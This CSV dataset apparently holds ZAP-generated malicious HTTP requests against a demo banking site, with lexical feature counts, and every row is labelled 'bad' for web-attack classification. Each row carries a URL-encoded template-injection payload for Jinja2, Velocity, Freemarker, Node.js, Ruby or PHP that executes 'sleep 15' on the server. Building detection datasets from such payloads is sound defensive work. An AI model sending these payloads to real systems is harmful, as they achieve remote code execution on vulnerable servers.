method,path,body,single_q,double_q,dashes,braces,spaces,percentages,semicolons,angle_brackets,special_chars,path_length,body_length,badwords_count,class
GET,/index.jsp?content=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,,0,4,0,2,2,0,0,0,0,84,0,1,bad
POST,/sendFeedback,cfile=comments.txt&name=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,6,0,8,8,0,0,0,0,13,263,2,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,,4,4,0,6,5,0,0,0,0,188,0,1,bad
GET,/survey_questions.jsp?step=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,,4,0,0,3,3,0,0,0,0,116,0,1,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,0,6,0,8,1,0,0,0,0,12,165,2,bad
GET,/static/index.jsp?content=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E,,4,0,0,3,2,0,0,2,0,114,0,1,bad
GET,/search.jsp?query=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,,4,0,0,3,1,0,0,0,0,103,0,1,bad
GET,/Privacypolicy.jsp?sec=%7Bsystem%28%22sleep+15%22%29%7D&template=US,,0,2,0,1,1,0,0,0,0,55,0,2,bad
GET,/default.jsp?content=%23%7B%25x%28sleep+15%29%7D,,0,0,0,1,1,0,0,0,0,36,0,1,bad
GET,/Documents/JohnSmith/index.jsp?content=%7Bsystem%28%22sleep+15%22%29%7D,,0,2,0,1,1,0,0,0,0,59,0,2,bad
GET,/index.jsp?content=%3C%25%3D%25x%28sleep+15%29%25%3E&job=MortgageLendingAccountExecutive%3ASales,,0,0,0,1,1,0,0,2,0,78,0,1,bad
GET,/disclaimer.htm?url=%23%7B%25x%28sleep+15%29%7D,,0,0,0,1,1,0,0,0,0,35,0,1,bad
POST,/sendFeedback,cfile=comments.txt&name=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,0,0,3,10,0,0,0,0,13,210,1,bad
GET,/index.jsp?content=%3C%25%3D%25x%28sleep+15%29%25%3E,,0,0,0,1,1,0,0,2,0,36,0,1,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,,0,10,0,5,4,0,0,0,0,209,0,1,bad
GET,/survey_questions.jsp?step=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E,,4,0,0,3,2,0,0,2,0,115,0,1,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,4,0,0,3,3,0,0,0,0,12,112,1,bad
GET,/static/index.jsp?content=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,,4,0,0,3,1,0,0,0,0,111,0,1,bad
GET,/search.jsp?query=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,,4,4,0,6,2,0,0,0,0,144,0,1,bad
GET,/default.jsp?content=%7Bsystem%28%22sleep+15%22%29%7D,,0,2,0,1,1,0,0,0,0,41,0,2,bad
GET,/Privacypolicy.jsp?sec=Careers&template=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D,,0,4,0,2,5,0,0,2,0,116,0,1,bad
GET,/index.jsp?content=%23%7B%25x%28sleep+15%29%7D&job=MortgageLendingAccountExecutive%3ASales,,0,0,0,1,1,0,0,0,0,76,0,1,bad
GET,/disclaimer.htm?url=%7Bsystem%28%22sleep+15%22%29%7D,,0,2,0,1,1,0,0,0,0,40,0,2,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,,0,4,0,2,5,0,0,0,0,126,0,1,bad
POST,/sendFeedback,cfile=comments.txt&name=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,0,0,3,9,0,0,2,0,13,209,1,bad
GET,/survey_questions.jsp?step=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,,4,0,0,3,1,0,0,0,0,112,0,1,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E,4,0,0,3,2,0,0,2,0,12,111,1,bad
GET,/index.jsp?content=%23%7B%25x%28sleep+15%29%7D,,0,0,0,1,1,0,0,0,0,34,0,1,bad
GET,/static/index.jsp?content=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,,4,4,0,6,2,0,0,0,0,152,0,1,bad
GET,/search.jsp?query=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,,0,10,0,5,1,0,0,0,0,165,0,1,bad
GET,/Privacypolicy.jsp?sec=Careers&template=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,,0,6,0,8,1,0,0,0,0,182,0,2,bad
GET,/index.jsp?content=%7Bsystem%28%22sleep+15%22%29%7D&job=MortgageLendingAccountExecutive%3ASales,,0,2,0,1,1,0,0,0,0,81,0,2,bad
POST,/sendFeedback,cfile=comments.txt&name=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,0,0,3,8,0,0,0,0,13,206,1,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,,0,4,0,2,5,0,0,0,0,127,0,1,bad
GET,/survey_questions.jsp?step=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,,4,4,0,6,2,0,0,0,0,153,0,1,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,4,0,0,3,1,0,0,0,0,12,108,1,bad
GET,/static/index.jsp?content=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,,0,10,0,5,1,0,0,0,0,173,0,1,bad
GET,/index.jsp?content=%7Bsystem%28%22sleep+15%22%29%7D,,0,2,0,1,1,0,0,0,0,39,0,2,bad
GET,/search.jsp?query=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,,0,4,0,2,2,0,0,0,0,82,0,1,bad
GET,/Privacypolicy.jsp?sec=Careers&template=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,,4,0,0,3,3,0,0,0,0,129,0,1,bad
GET,/index.jsp?content=inside_jobs.htm&job=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D,,0,4,0,2,5,0,0,2,0,115,0,1,bad
POST,/sendFeedback,cfile=comments.txt&name=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,4,0,6,9,0,0,0,0,13,247,1,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%3C%25%3D%25x%28sleep+15%29%25%3E,,0,0,0,1,4,0,0,2,0,79,0,1,bad
GET,/survey_questions.jsp?step=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,,0,10,0,5,1,0,0,0,0,174,0,1,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,4,4,0,6,2,0,0,0,0,12,149,1,bad
GET,/static/index.jsp?content=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,,0,4,0,2,2,0,0,0,0,90,0,1,bad
GET,/search.jsp?query=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,,0,4,0,2,2,0,0,0,0,83,0,1,bad
GET,/Privacypolicy.jsp?sec=Careers&template=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E,,4,0,0,3,2,0,0,2,0,128,0,1,bad
GET,/index.jsp?content=inside_jobs.htm&job=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,,0,6,0,8,1,0,0,0,0,181,0,2,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%23%7B%25x%28sleep+15%29%7D,,0,0,0,1,4,0,0,0,0,77,0,1,bad
POST,/sendFeedback,cfile=comments.txt&name=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,10,0,5,8,0,0,0,0,13,268,1,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,0,10,0,5,1,0,0,0,0,12,170,1,bad
GET,/survey_questions.jsp?step=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,,0,4,0,2,2,0,0,0,0,91,0,1,bad
GET,/static/index.jsp?content=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,,0,4,0,2,2,0,0,0,0,91,0,1,bad
GET,/search.jsp?query=%3C%25%3D%25x%28sleep+15%29%25%3E,,0,0,0,1,1,0,0,2,0,35,0,1,bad
GET,/Privacypolicy.jsp?sec=Careers&template=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,,4,0,0,3,1,0,0,0,0,125,0,1,bad
GET,/index.jsp?content=inside_jobs.htm&job=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,,4,0,0,3,3,0,0,0,0,128,0,1,bad
POST,/sendFeedback,cfile=comments.txt&name=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,4,0,2,9,0,0,0,0,13,185,1,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%7Bsystem%28%22sleep+15%22%29%7D,,0,2,0,1,4,0,0,0,0,82,0,2,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,0,4,0,2,2,0,0,0,0,12,87,1,bad
GET,/survey_questions.jsp?step=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,,0,4,0,2,2,0,0,0,0,92,0,1,bad
GET,/static/index.jsp?content=%3C%25%3D%25x%28sleep+15%29%25%3E,,0,0,0,1,1,0,0,2,0,43,0,1,bad
GET,/search.jsp?query=%23%7B%25x%28sleep+15%29%7D,,0,0,0,1,1,0,0,0,0,33,0,1,bad
GET,/index.jsp?content=inside_jobs.htm&job=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E,,4,0,0,3,2,0,0,2,0,127,0,1,bad
GET,/Privacypolicy.jsp?sec=Careers&template=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,,4,4,0,6,2,0,0,0,0,166,0,1,bad
POST,/sendFeedback,cfile=comments.txt&name=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,4,0,2,9,0,0,0,0,13,186,1,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,0,4,0,2,2,0,0,0,0,12,88,1,bad
GET,/survey_questions.jsp?step=%3C%25%3D%25x%28sleep+15%29%25%3E,,0,0,0,1,1,0,0,2,0,44,0,1,bad
GET,/search.jsp?query=%7Bsystem%28%22sleep+15%22%29%7D,,0,2,0,1,1,0,0,0,0,38,0,2,bad
GET,/static/index.jsp?content=%23%7B%25x%28sleep+15%29%7D,,0,0,0,1,1,0,0,0,0,41,0,1,bad
GET,/Privacypolicy.jsp?sec=Careers&template=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,,0,10,0,5,1,0,0,0,0,187,0,1,bad
GET,/index.jsp?content=inside_jobs.htm&job=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,,4,0,0,3,1,0,0,0,0,124,0,1,bad
POST,/sendFeedback,cfile=comments.txt&name=%3C%25%3D%25x%28sleep+15%29%25%3E&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,1,8,0,0,2,0,13,138,1,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%3C%25%3D%25x%28sleep+15%29%25%3E,0,0,0,1,1,0,0,2,0,12,40,1,bad
GET,/survey_questions.jsp?step=%23%7B%25x%28sleep+15%29%7D,,0,0,0,1,1,0,0,0,0,42,0,1,bad
GET,/static/index.jsp?content=%7Bsystem%28%22sleep+15%22%29%7D,,0,2,0,1,1,0,0,0,0,46,0,2,bad
GET,/Privacypolicy.jsp?sec=Careers&template=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,,0,4,0,2,2,0,0,0,0,104,0,1,bad
GET,/index.jsp?content=inside_jobs.htm&job=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,,4,4,0,6,2,0,0,0,0,165,0,1,bad
POST,/sendFeedback,cfile=comments.txt&name=%23%7B%25x%28sleep+15%29%7D&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,1,8,0,0,0,0,13,136,1,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%23%7B%25x%28sleep+15%29%7D,0,0,0,1,1,0,0,0,0,12,38,1,bad
GET,/survey_questions.jsp?step=%7Bsystem%28%22sleep+15%22%29%7D,,0,2,0,1,1,0,0,0,0,47,0,2,bad
GET,/Privacypolicy.jsp?sec=Careers&template=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,,0,4,0,2,2,0,0,0,0,105,0,1,bad
GET,/index.jsp?content=inside_jobs.htm&job=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,,0,10,0,5,1,0,0,0,0,186,0,1,bad
POST,/sendFeedback,cfile=comments.txt&name=%7Bsystem%28%22sleep+15%22%29%7D&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,2,0,1,8,0,0,0,0,13,141,2,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=%7Bsystem%28%22sleep+15%22%29%7D,0,2,0,1,1,0,0,0,0,12,43,2,bad
GET,/Privacypolicy.jsp?sec=Careers&template=%3C%25%3D%25x%28sleep+15%29%25%3E,,0,0,0,1,1,0,0,2,0,57,0,1,bad
GET,/index.jsp?content=inside_jobs.htm&job=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,,0,4,0,2,2,0,0,0,0,103,0,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,4,0,2,12,0,0,2,0,13,197,1,bad
GET,/Privacypolicy.jsp?sec=Careers&template=%23%7B%25x%28sleep+15%29%7D,,0,0,0,1,1,0,0,0,0,55,0,1,bad
GET,/index.jsp?content=inside_jobs.htm&job=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,,0,4,0,2,2,0,0,0,0,104,0,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,6,0,8,8,0,0,0,0,13,263,2,bad
GET,/Privacypolicy.jsp?sec=Careers&template=%7Bsystem%28%22sleep+15%22%29%7D,,0,2,0,1,1,0,0,0,0,60,0,2,bad
GET,/index.jsp?content=inside_jobs.htm&job=%3C%25%3D%25x%28sleep+15%29%25%3E,,0,0,0,1,1,0,0,2,0,56,0,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,0,0,3,10,0,0,0,0,13,210,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,0,0,3,9,0,0,2,0,13,209,1,bad
GET,/index.jsp?content=inside_jobs.htm&job=%23%7B%25x%28sleep+15%29%7D,,0,0,0,1,1,0,0,0,0,54,0,1,bad
GET,/index.jsp?content=inside_jobs.htm&job=%7Bsystem%28%22sleep+15%22%29%7D,,0,2,0,1,1,0,0,0,0,59,0,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,0,0,3,8,0,0,0,0,13,206,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,4,4,0,6,9,0,0,0,0,13,247,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,10,0,5,8,0,0,0,0,13,268,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,4,0,2,9,0,0,0,0,13,185,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,4,0,2,9,0,0,0,0,13,186,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%3C%25%3D%25x%28sleep+15%29%25%3E&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,1,8,0,0,2,0,13,138,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%23%7B%25x%28sleep+15%29%7D&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,1,8,0,0,0,0,13,136,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%7Bsystem%28%22sleep+15%22%29%7D&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,2,0,1,8,0,0,0,0,13,141,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D&comments=&submit=+Submit+,0,4,0,2,7,0,0,2,0,13,153,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D&comments=&submit=+Submit+,0,6,0,8,3,0,0,0,0,13,219,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D&comments=&submit=+Submit+,4,0,0,3,5,0,0,0,0,13,166,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E&comments=&submit=+Submit+,4,0,0,3,4,0,0,2,0,13,165,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D&comments=&submit=+Submit+,4,0,0,3,3,0,0,0,0,13,162,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D&comments=&submit=+Submit+,4,4,0,6,4,0,0,0,0,13,203,1,bad
GET,/images/index.jsp?content=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E,,4,0,0,3,2,0,0,2,0,114,0,1,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D&comments=&submit=+Submit+,0,10,0,5,3,0,0,0,0,13,224,1,bad
GET,/images/index.jsp?content=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,,4,0,0,3,1,0,0,0,0,111,0,1,bad
